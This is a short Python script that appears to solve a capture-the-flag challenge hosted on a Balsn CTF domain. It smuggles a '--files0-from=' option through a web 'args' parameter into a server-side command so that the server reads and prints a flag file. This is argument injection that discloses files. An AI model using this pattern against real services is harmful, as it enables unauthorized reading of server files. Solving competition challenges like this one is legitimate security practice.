import requests
import time
import string

url = 'http://windows-xp-media-player.balsnctf.com'

def create(payload, session):
    r = session.get(url, params=payload)
    return
def stat(payload, session):
    r = session.get(url, params=payload)
    print(r.text)

path = '/flag/f176872c644795fd45b6719f8723ca90/368f097864ce90340ef141da53983e4b'

session = requests.Session()
r = session.get(url)
cookie = r.cookies.get_dict()
uid = r.text.split('User: ')[1][0:32]

payload1 = {'op':'create', 'args':'-p /sandbox/{}/--files0-from={}'.format(uid, path)}
create(payload1, session)
payload2 = {'op':'stat', 'args':'--files0-from={}'.format(path)}
stat(payload2, session)
